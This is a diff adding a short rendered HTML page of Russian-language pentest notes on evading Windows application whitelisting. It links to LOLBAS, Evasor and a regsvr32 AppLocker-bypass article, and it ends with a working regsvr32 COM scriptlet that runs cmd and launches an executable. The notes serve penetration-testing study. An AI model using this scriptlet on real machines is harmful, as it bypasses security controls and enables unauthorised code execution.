@@ -1,0 +1,39 @@
+I"2<h1 class="no_toc" id="оглавление">Оглавление</h1>
+
+<ul id="markdown-toc">
+  <li><a href="#введение" id="markdown-toc-введение">Введение</a></li>
+  <li><a href="#ссылки" id="markdown-toc-ссылки">Ссылки</a></li>
+</ul>
+
+<h1 id="введение">Введение</h1>
+<p>В принципе, вариантов у нас немного, либо ищем бинарники которые мы можем запускать и которые могут что-то запускать, либо ищем бинарники которые можно запускать и которым мы можем менять конфиги, как например пути к либам.</p>
+
+<p>А еще есть ПроцесХайджекинг, но про него я много не знаю.</p>
+
+<h1 id="ссылки">Ссылки</h1>
+<p><a href="https://github.com/khr0x40sh/WhiteListEvasion">Запуск пейлоада с помощью .NET</a></p>
+
+<p><a href="https://lolbas-project.github.io/">Список всех интересных бинарников винды которые могут быть использованны против неё</a></p>
+
+<p><a href="https://github.com/cyberark/Evasor/">Исходники штуки которая ищет недостатки в вайтлистинге на конкретной машине</a></p>
+
+<p><a href="https://pentestlab.blog/2017/05/11/applocker-bypass-regsvr32/">Обход вайтлиста с помощью regsvr32</a></p>
+
+<p>Пример кода для regsvr32</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?XML version="1.0"?&gt;
+&lt;scriptlet&gt;
+&lt;registration         
+progid="Pentest"       
+classid="{F0001111-0000-0000-0000-0000FEEDACDC}" &gt;
+&lt;script language="JScript"&gt;
+ 
+&lt;![CDATA[   
+var r = new ActiveXObject("WScript.Shell").Run("cmd /k cd c:\ &amp; pentestlab.exe"); 
+]]&gt;
+ 
+&lt;/script&gt;
+&lt;/registration&gt;
+&lt;/scriptlet&gt;
+</code></pre></div></div>
+:ET
